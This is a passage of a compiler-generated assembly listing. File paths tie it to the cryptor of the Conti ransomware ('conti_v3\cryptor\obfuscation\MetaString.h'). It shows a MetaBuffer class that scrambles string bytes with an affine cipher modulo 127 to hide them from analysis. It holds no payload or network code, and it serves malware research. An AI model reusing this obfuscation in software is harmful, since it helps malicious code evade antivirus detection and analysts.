  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  004cd	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  004d1	88 85 c0 00 00
	00		 mov	 BYTE PTR tv294[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  004d7	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  004de	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  004e5	5f		 pop	 rdi
  004e6	5d		 pop	 rbp
  004e7	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 0b	 sub	 eax, 11
  0002d	6b c0 33	 imul	 eax, eax, 51		; 00000033H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 05	 imul	 eax, eax, 5
  0002d	83 c0 0b	 add	 eax, 11
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 16	 cmp	 QWORD PTR i$1[rbp], 22
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv252 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
